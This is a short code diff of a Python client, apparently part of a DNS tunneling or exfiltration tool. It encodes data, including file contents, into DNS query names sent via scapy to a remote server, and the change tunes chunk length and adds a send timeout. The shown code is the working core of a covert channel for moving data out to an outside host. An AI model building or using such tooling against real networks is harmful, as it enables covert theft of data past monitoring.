@@ -19,11 +19,12 @@ class Client:
     def __init__(self, cli_object):
         self.protocol = "dns_resolved"
         self.remote_server = cli_object.ip
+        self.max_length = 30
         if cli_object.file is None:
             self.file_transfer = False
             self.length = 50
         else:
-            self.length = 50
+            self.length = 30
             if "/" in cli_object.file:
                 self.file_transfer = cli_object.file.split("/")[-1]
             else:
@@ -85,9 +86,9 @@ class Client:
                 try:
                     while True:
 
-                        request_packet = IP(dst=nameserver)/UDP()/DNS(
-                            rd=1, qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="A")])
-                        response_packet = sr1(request_packet, iface='eth0', verbose=False)
+                        response_packet = sr1(IP(dst=nameserver)/UDP()/DNS(
+                            rd=1, qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="A")]),
+                            verbose=False, timeout=2)
 
                         if response_packet:
                             if response_packet.haslayer(DNSRR):
